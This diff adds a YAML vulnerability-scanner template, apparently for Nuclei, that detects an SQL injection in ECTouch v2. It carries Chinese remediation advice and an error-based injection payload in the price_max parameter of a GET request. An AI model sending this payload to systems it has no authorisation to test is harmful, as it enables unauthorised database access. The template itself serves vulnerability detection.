@@ -1,0 +1,28 @@
+id: etouch-v2-sqli
+info:
+  name: Ectouch v2 SQL Injection
+  author:
+  - l0ne1y
+  description: |-
+    Ectouch V2 存在SQL注入漏洞
+    ECTouch v2 中的 index.phP页面存在SQL注入。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    升级至最新版本：
+    https://www.ectouch.cn/
+
+    临时修复方案：<br/>1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br/>2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。<br/>3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - c4ca4238a0b923820dcc509a6f75849b
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'''''
+  method: GET
